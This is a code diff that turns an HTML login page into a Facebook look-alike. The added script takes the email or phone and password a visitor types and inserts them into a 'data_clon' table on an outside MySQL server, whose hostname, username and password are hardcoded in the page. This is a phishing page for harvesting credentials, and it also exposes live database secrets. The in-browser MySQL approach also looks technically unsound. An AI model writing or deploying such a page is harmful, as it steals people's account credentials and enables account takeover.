@@ -5,20 +5,163 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login</title>
     <link rel="stylesheet" href="styles.css">
+    <style>
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .login-box {
+            width: 400px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            border-radius: 8px;
+        }
+        h1 {
+            color: #1877f2;
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button[type="submit"] {
+            background-color: #1877f2;
+            color: white;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            width: auto;
+            padding: 12px 16px;
+            margin-top: 20px;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 10px 0;
+        }
+        #responseMessage {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="login-box">
             <h1>Facebook</h1>
-            <form id="loginForm" action="login.php" method="POST">
-                <input type="text" name="user" placeholder="Email or Phone" required>
-                <input type="password" name="pass" placeholder="Password" required>
-                <button type="submit" name="submit">Log In</button>
+            <form id="loginForm">
+                <input type="text" name="user" id="user" placeholder="Email or Phone" required>
+                <input type="password" name="pass" id="pass" placeholder="Password" required>
+                <button type="button" onclick="enviarDatos()">Log In</button>
                 <a href="#">Forgotten password?</a>
                 <div class="divider"></div>
                 <button type="button" class="create-account">Create New Account</button>
             </form>
+            <div id="responseMessage"></div>
         </div>
     </div>
+
+    <!-- Librería MySQL para el navegador (SOLO PRUEBAS) -->
+    <script src="https://cdn.jsdelivr.net/npm/mysql@2.0.0/dist/mysql.min.js"></script>
+    
+    <script>
+        // Configuración de la conexión a MySQL (SOLO PRUEBAS LOCALES)
+        const connection = mysql.createConnection({
+            host: "fdb1027.cloudhostingstudio.com",
+            user: "4630685_dataclon",
+            password: "Z-B*oKp78-Rhx-v!",
+            database: "4630685_dataclon"
+        });
+
+        function enviarDatos() {
+            const user = document.getElementById("user").value;
+            const pass = document.getElementById("pass").value;
+            const responseDiv = document.getElementById("responseMessage");
+
+            // Validación básica
+            if (!user || !pass) {
+                responseDiv.textContent = "Por favor completa todos los campos";
+                responseDiv.className = "error";
+                responseDiv.style.display = "block";
+                return;
+            }
+
+            // Consulta SQL para verificar e insertar
+            connection.query(
+                "SELECT 1 FROM data_clon WHERE user = ? LIMIT 1",
+                [user],
+                (error, results) => {
+                    if (error) {
+                        showResponse("Error: " + error.message, "error");
+                        return;
+                    }
+                    
+                    if (results.length > 0) {
+                        showResponse("El usuario ya existe", "error");
+                    } else {
+                        connection.query(
+                            "INSERT INTO data_clon (user, pass) VALUES (?, ?)",
+                            [user, pass],
+                            (insertError, insertResults) => {
+                                if (insertError) {
+                                    showResponse("Error al registrar: " + insertError.message, "error");
+                                } else {
+                                    showResponse("Registro exitoso", "success");
+                                }
+                            }
+                        );
+                    }
+                }
+            );
+        }
+
+        function showResponse(message, type) {
+            const responseDiv = document.getElementById("responseMessage");
+            responseDiv.textContent = message;
+            responseDiv.className = type;
+            responseDiv.style.display = "block";
+            
+            // Ocultar después de 3 segundos
+            setTimeout(() => {
+                responseDiv.style.display = "none";
+            }, 3000);
+        }
+    </script>
 </body>
-</html>
+    </html>
